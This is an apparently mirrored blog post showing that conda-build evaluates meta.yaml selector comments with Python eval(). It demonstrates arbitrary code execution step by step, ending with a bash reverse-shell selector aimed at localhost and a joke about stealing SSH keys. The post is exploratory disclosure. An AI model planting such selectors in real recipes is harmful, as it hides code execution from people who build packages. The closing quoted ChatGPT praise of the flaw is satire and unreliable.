<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://astrid.tech/2024/02/24/0/conda-recipe-selector-abuse/">Original</a>
    <h1>Abusing Conda&#39;s Turing-Complete YAML Comments</h1>
    
    <div id="readability-page-1" class="page"><div><article><header><p>my favorite build system, jinja-preprocessed-eval-preprocessed YAML</p><p><span title="created: 2024-02-23 23:22
published: 2024-02-24 01:25"><time datetime="2024-02-24 01:25">2024-02-24 01:25</time></span></p><p><span><a href="https://astrid.tech/t/python">python</a> <a href="https://astrid.tech/t/anaconda">Anaconda</a> <a href="https://astrid.tech/t/cybersecurity">cybersecurity</a> </span></p></header><p>I was trying to submit a Conda package to
<a href="https://conda-forge.org/">Conda Forge</a>, and I needed a way to mark it as Linux
and MacOS only. As it turns out, you are supposed to define something like this
in your <code>meta.yaml</code> build configuration file:</p>
<pre lang="yaml"><code><span>build</span><span>:
</span><span>  </span><span>skip</span><span>: </span><span>True </span><span># [win]
</span></code></pre>
<p>What this seems to mean is, “skip the build if we are in windows.” Why is it a
comment? I don’t know, but that’s what it is.</p>
<p>This package also is a Python 3.9 and above thing – we don’t support 3.8 or
under. So, how do I add that constraint?</p>
<p>Well, turns out this strange construct is called a “selector,” and there’s a
section about what you can do with it in the
<a href="https://docs.conda.io/projects/conda-build/en/stable/resources/define-metadata.html#preprocessing-selectors">Conda docs</a></p>
<blockquote>
<p>You can add selectors to any line, which are used as part of a preprocessing
stage. Before the <code>meta.yaml</code> file is read, each selector is evaluated and if
it is <code>False</code>, the line that it is on is removed. A selector has the form
<code># [&lt;selector&gt;]</code> at the end of a line.</p>
<pre lang="yaml"><code><span>source</span><span>:
</span><span>  </span><span>url</span><span>: </span><span>http://path/to/unix/source    </span><span># [not win]
</span><span>  </span><span>url</span><span>: </span><span>http://path/to/windows/source </span><span># [win]
</span></code></pre>
</blockquote>
<p>Oh, that makes sense. Cursed, because YAML <em>shouldn’t</em> look like this with
multiple keys in one object, but it makes sense.</p>
<blockquote>
<p>A selector is a valid Python statement that is executed.</p>
</blockquote>
<p>Wait… what?</p>
<blockquote>
<p>Because the selector is any valid Python expression, complicated logic is
possible:</p>
<pre lang="yaml"><code><span>source</span><span>:
</span><span>  </span><span>url</span><span>: </span><span>http://path/to/windows/source      </span><span># [win]
</span><span>  </span><span>url</span><span>: </span><span>http://path/to/python2/unix/source </span><span># [unix and py2k]
</span><span>  </span><span>url</span><span>: </span><span>http://path/to/python3/unix/source </span><span># [unix and py&gt;=35]
</span></code></pre>
</blockquote>
<p>Wait, <em>WHAT</em>?</p>
<p>So… what it’s saying is… this is what I want?</p>
<pre lang="yaml"><code><span>build</span><span>:
</span><span>  </span><span>skip</span><span>: </span><span>True </span><span># [win or py &lt; 39]
</span></code></pre>
<p>I put that into my <code>meta.yaml</code> and… turns out it made it work!</p>
<p>But then, I got wondering, what <em>other</em> kinds of “complicated logic” is allowed
in this selector?</p>
<h2><a href="#trying-to-accomplish-arbitrary-code-execution" aria-hidden="true" id="header-trying-to-accomplish-arbitrary-code-execution"></a>Trying to accomplish arbitrary code execution</h2>
<p>I borrowed the following <code>meta.yaml</code> file from
<a href="https://github.com/conda-forge/staged-recipes/blob/main/recipes/example/meta.yaml">conda-forge’s example</a>,
but stripped it down a lot.</p>
<pre lang="yaml"><code><span>{% </span><span>set name = &#34;simplejson&#34; %</span><span>}
</span><span>{% </span><span>set version = &#34;3.8.2&#34; %</span><span>}
</span><span>
</span><span>package</span><span>:
</span><span>  </span><span>name</span><span>: {{ </span><span>name|lower </span><span>}}
</span><span>  </span><span>version</span><span>: {{ </span><span>version </span><span>}}
</span><span>
</span><span>source</span><span>:
</span><span>  </span><span>url</span><span>: </span><span>https://pypi.io/packages/source/{{ name[0] }}/{{ name }}/{{ name }}-{{ version }}.tar.gz
</span><span>  </span><span>sha256</span><span>: </span><span>2b3a0c466fb4a1014ea131c2b8ea7c519f9278eba73d6fcb361b7bdb4fd494e9
</span><span>
</span><span>build</span><span>:
</span><span>  </span><span>script</span><span>: {{ </span><span>PYTHON </span><span>}} </span><span>-m pip install . -vv
</span><span>  </span><span>number</span><span>: </span><span>0
</span><span>
</span><span>requirements</span><span>:
</span><span>  </span><span>host</span><span>:
</span><span>    - </span><span>python
</span><span>    - </span><span>pip
</span><span>  </span><span>run</span><span>:
</span><span>    - </span><span>python
</span><span>
</span><span>test</span><span>:
</span><span>  </span><span>skip</span><span>: </span><span>True
</span><span>
</span><span>about</span><span>:
</span><span>  </span><span>home</span><span>: </span><span>https://github.com/simplejson/simplejson
</span><span>  </span><span>summary</span><span>: &#39;</span><span>Simple, fast, extensible JSON encoder/decoder for Python</span><span>&#39;
</span><span>  </span><span>description</span><span>: </span><span>test
</span><span>  </span><span>dev_url</span><span>: </span><span>https://github.com/simplejson/simplejson
</span><span>
</span><span>extra</span><span>:
</span><span>  </span><span>recipe-maintainers</span><span>:
</span><span>    - </span><span>ifd3f
</span></code></pre>
<p>Then, I inserted the following string to see if it would work.</p>
<pre lang="yaml"><code><span>build</span><span>:
</span><span>  </span><span>skip</span><span>: </span><span>True </span><span># [open(&#39;/tmp/foo&#39;, &#39;w&#39;).write(&#34;nyaaaaaa&#34;)]
</span></code></pre>
<p>I ran <code>conda build</code>:</p>
<pre><code><span>nyaaaaaa(base) [astrid@lab test]$ conda build .
</span><span>WARNING: No numpy version specified in conda_build_config.yaml.  Falling back to default numpy value of 1.22
</span><span>Adding in variants from internal_defaults
</span><span>Skipped: simplejson from /home/astrid/test defines build/skip for this configuration ({&#39;target_platform&#39;: &#39;linux-64&#39;, &#39;python&#39;: &#39;3.11&#39;}).
</span><span>
</span><span>&lt;snip&gt;
</span></code></pre>
<p>It spits out a lot of output. We don’t need to go over all of it. It seemed to
have immediately quit.</p>
<p>But, checking <code>/tmp/foo</code>…</p>
<pre><code><span>(base) [astrid@lab test]$ cat /tmp/foo
</span><span>nyaaaaaa(base) [astrid@lab test]$
</span></code></pre>
<p>It fucking worked!!!</p>
<h2><a href="#where-can-the-selector-be-placed" aria-hidden="true" id="header-where-can-the-selector-be-placed"></a>Where can the selector be placed?</h2>
<p>I thought it might be smart to do something like this so that I don’t
accidentally spit out a falsy value and make conda actually build the project,
instead of only doing whatever shenanigans I was trying to accomplish.</p>
<pre lang="yaml"><code><span>...
</span><span>source</span><span>:
</span><span>  </span><span>url</span><span>: </span><span>https://pypi.io/packages/source/{{ name[0] }}/{{ name }}/{{ name }}-{{ version }}.tar.gz
</span><span>  </span><span>sha256</span><span>: </span><span>2b3a0c466fb4a1014ea131c2b8ea7c519f9278eba73d6fcb361b7bdb4fd494e9
</span><span>
</span><span># [open(&#39;/tmp/foo2&#39;, &#39;w&#39;).write(&#34;nyaaaaaa&#34;)]
</span><span>
</span><span>build</span><span>:
</span><span>  </span><span>skip</span><span>: </span><span>True
</span><span>  </span><span>script</span><span>: {{ </span><span>PYTHON </span><span>}} </span><span>-m pip install . -vv
</span><span>...
</span></code></pre>
<pre><code><span>(base) [astrid@lab test]$ conda build . &amp;&amp; cat /tmp/foo2
</span><span>...
</span><span>cat: /tmp/foo2: No such file or directory
</span></code></pre>
<p>Why didn’t it work? Maybe it’s because the selector code is searching
specifically for a comment with stuff in front of it. I don’t know. Either way,
I can live with putting it on one of the attributes.</p>
<h2><a href="#making-it-run-a-shell-command" aria-hidden="true" id="header-making-it-run-a-shell-command"></a>Making it run a shell command</h2>
<p>Let’s try to have it run a shell. This can’t be too hard, right?</p>
<pre lang="yaml"><code><span>skip</span><span>: </span><span>True </span><span># [import os; os.system(&#34;echo test&#34;)]
</span></code></pre>
<pre><code><span>(base) [astrid@lab test]$ conda build .
</span><span>WARNING: No numpy version specified in conda_build_config.yaml.  Falling back to default numpy value of 1.22
</span><span>Error: Invalid selector in meta.yaml line 14:
</span><span>offending line:
</span><span>  skip: True # [import os; os.system(&#34;echo test&#34;)]
</span><span>exception:
</span><span>invalid syntax (&lt;string&gt;, line 1)
</span></code></pre>
<p>Seems like it didn’t like that. Probably because it specifically accepts an
expression, not a series of statements.</p>
<p>After a bit of digging around, turns out the answer was <code>exec()</code> (plus a
<code>or True</code> to make it not build).</p>
<pre lang="yaml"><code><span>skip</span><span>: </span><span>True </span><span># [exec(&#39;&#39;&#39;import os; os.system(&#34;sh -c &#39;echo shell moment &gt; /tmp/asdf&#39;&#34;)&#39;&#39;&#39;) or True]
</span></code></pre>
<pre><code><span>(base) [astrid@lab test]$ rm -f /tmp/asdf &amp;&amp; conda build . &amp;&amp; cat /tmp/asdf
</span><span>WARNING: No numpy version specified in conda_build_config.yaml.  Falling back to default numpy value of 1.22
</span><span>
</span><span>&lt;snip&gt;
</span><span>
</span><span>Source and build intermediates have been left in /home/astrid/miniconda3/conda-bld.
</span><span>There are currently 3 accumulated.
</span><span>To remove them, you can run the ```conda build purge``` command
</span><span>shell moment
</span><span>(base) [astrid@lab test]$
</span></code></pre>
<h2><a href="#making-it-talk-to-other-computers" aria-hidden="true" id="header-making-it-talk-to-other-computers"></a>Making it talk to other computers</h2>
<p>At this point, you can kinda just run whatever. Installing <code>netcat</code>, I used
this:</p>
<pre lang="yaml"><code><span>skip</span><span>: </span><span>True </span><span># [exec(&#39;&#39;&#39;import os; os.system(&#34;sh -c &#39;echo netnya | nc localhost 12345&#39;&#34;)&#39;&#39;&#39;) or True]
</span></code></pre>
<p>In a separate shell, I opened a server:</p>
<pre><code><span>(base) [astrid@lab test]$ nc -l localhost 12345
</span></code></pre>
<p>Performing a build…</p>
<pre><code><span>(base) [astrid@lab test]$ conda build .
</span><span>WARNING: No numpy version specified in conda_build_config.yaml.  Falling back to default numpy value of 1.22
</span></code></pre>
<p>… conda froze! But in the other tab, I got the message.</p>
<pre><code><span>(base) [astrid@lab test]$ nc -l localhost 12345
</span><span>netnya
</span></code></pre>
<p>I typed <code>asdfasdf</code> into the server tab, and got data back in the builder.</p>
<pre><code><span>(base) [astrid@lab test]$ conda build .
</span><span>WARNING: No numpy version specified in conda_build_config.yaml.  Falling back to default numpy value of 1.22
</span><span>asdfasdf
</span></code></pre>
<h2><a href="#making-it-spawn-a-reverse-shell" aria-hidden="true" id="header-making-it-spawn-a-reverse-shell"></a>Making it spawn a reverse shell</h2>
<p>This is, of course, the logical final step. In fact, this selector doesn’t even
need netcat.</p>
<pre lang="yaml"><code><span>skip</span><span>: </span><span>True </span><span># [exec(&#39;&#39;&#39;import os; os.system(&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/localhost/12345  0&gt;&amp;1&#39;&#34;)&#39;&#39;&#39;) or True]
</span></code></pre>
<h2><a href="#exploitability" aria-hidden="true" id="header-exploitability"></a>Exploitability?</h2>
<p>Honestly, I don’t think that there’s much that’s exploitable about this that
isn’t already exploitable. As far as I know, <code>conda build</code> doesn’t do
containerization or other security measures like that, so any amount of
exploitation I can do here is probably already exploitable by the build script.</p>
<p>I mean, I guess I <em>could</em> see a potential case where <code>conda build</code> has a command
that spits out the <code>meta.yaml</code> after it has done its jinja and selector
postprocessing, but without executing any scripts, and the user would expect
that no arbitrary code execution is happening. In practice, I don’t think that’s
really common – most people probably just run <code>conda build</code>.</p>
<p>However, this is great for recipe developers – this mechanism lets you make
your build logic be non-deterministic, and have arbitrarily-complicated logic
and I/O! You can do all sorts of things, like don’t build if the user’s name
starts with an “a,” combine this with curl and an HTTP server to act as a
killswitch for builds, make the metadata evaluation step “borrow” peoples’ SSH
keys, and more!</p>
<h2><a href="#whats-the-code-that-actually-calls-eval" aria-hidden="true" id="header-whats-the-code-that-actually-calls-eval"></a>What’s the code that actually calls eval?</h2>
<p>The great thing about open source is that you can actually answer this question!</p>
<p>In the <a href="https://astrid.tech/2024/02/24/0/conda-recipe-selector-abuse/conda-build-repo">conda-build repository</a>, I searched for <code>eval</code>, and
<a href="https://github.com/conda/conda-build/blob/cc7bb532eff61451853a8195f39688a2101a9548/conda_build/metadata.py#L255-L257">this was the function</a> that seems to do it.</p>
<pre lang="python"><code><span># We evaluate the selector and return True (keep this line) or False (drop this line)
</span><span># If we encounter a NameError (unknown variable in selector), then we replace it by False and
</span><span>#     re-run the evaluation
</span><span>def </span><span>eval_selector</span><span>(</span><span>selector_string</span><span>, </span><span>namespace</span><span>, </span><span>variants_in_place</span><span>):
</span><span>    </span><span>try</span><span>:
</span><span>        </span><span># TODO: is there a way to do this without eval?  Eval allows arbitrary
</span><span>        </span><span>#    code execution.
</span><span>        </span><span>return </span><span>eval</span><span>(selector_string, namespace, {})
</span><span>    </span><span>except </span><span>NameError </span><span>as </span><span>e:
</span><span>        </span><span>...
</span></code></pre>
<p>This code was last touched… <a href="https://astrid.tech/2024/02/24/0/conda-recipe-selector-abuse/pr-1753">2017, in PR #1753</a>. And that wasn’t the
thing that actually introduced the <code>eval()</code>, that commit just moved it to a
different place.
<a href="https://astrid.tech/2024/02/24/0/conda-recipe-selector-abuse/older-eval-line">Here’s what it used to look like before that commit</a>:</p>
<pre lang="python"><code><span>def </span><span>select_lines</span><span>(</span><span>data</span><span>, </span><span>namespace</span><span>):
</span><span>    </span><span>...
</span><span>
</span><span>    </span><span>try</span><span>:
</span><span>        </span><span># TODO: is there a way to do this without eval?  Eval allows arbitrary
</span><span>        </span><span>#    code execution.
</span><span>        </span><span>if </span><span>eval</span><span>(cond, namespace, {}):
</span><span>            lines.</span><span>append</span><span>(m.</span><span>group</span><span>(</span><span>1</span><span>) + trailing_quote)
</span><span>    </span><span>except</span><span>:
</span><span>        </span><span>...
</span><span>
</span></code></pre>
<p>The comment came <a href="https://astrid.tech/2024/02/24/0/conda-recipe-selector-abuse/fixes-recommended">in this 2016 commit</a> from either
<a href="https://astrid.tech/2024/02/24/0/conda-recipe-selector-abuse/qc-github-org">a group called Quantified Code</a> (whose website,
<a href="https://astrid.tech/2024/02/24/0/conda-recipe-selector-abuse/qc-broken-website">www.quantifiedcode.com</a>, appears to no longer work), or some
automated tool they appear to have written. The <code>eval()</code>, on the other hand,
came from
<a href="https://astrid.tech/2024/02/24/0/conda-recipe-selector-abuse/add-new-files-commit">this 2,532-line commit in 2014 with the very informative title of “add new files”</a>.</p>
<p>I tried searching the issues to see if anyone has complained about how silly
this <code>eval()</code> is, but I didn’t find anything. Perhaps people don’t mind at all.
Perhaps there are even other people out there who are including shell scripts in
their selectors!</p>
<h2><a href="#conclusion" aria-hidden="true" id="header-conclusion"></a>Conclusion</h2>
<p>Honestly, I don’t know how to conclude this. It’s a really silly thing that you
can do, but it’s not even particularly exploitable. What I probably would have
done if I wanted to implement something like this was cut the
selector/jinja/YAML crap and just let the user write a Python script to generate
this if you want your damn “flexibility.”</p>
<p>Okay, fine, maybe people really like their selector/jinja/YAML configs, and I
really just had to deal with that fact. In that case, I would just was write a
100-200 line parser and interpreter for selector booleans. But my guess is that
they probably rushed this and didn’t really fix it either.</p>
<p>Honestly, maybe I’m just being really negative. I’ll leave the final word to
ChatGPT, who I have asked to help us be more optimistic about
arbitrarily-executable YAML comments.</p>
<blockquote>
<p>Arbitrary code execution within configuration file comments epitomizes the
flexibility and agility central to modern DevOps practices, providing
developers with unparalleled customization, dynamic configuration management,
self-documentation, automation, and advanced configuration options. By
harnessing executable code snippets within comments, teams can swiftly adapt
to changing requirements, seamlessly integrating infrastructure as code (IaC)
principles into agile deployment pipelines and continuous
integration/continuous deployment (CI/CD) workflows. This capability fosters a
culture of innovation, enabling rapid iteration, experimentation, and
optimization, while ensuring infrastructure scalability and reliability.</p>
</blockquote>
</article></div></div>
  </body>
</html>
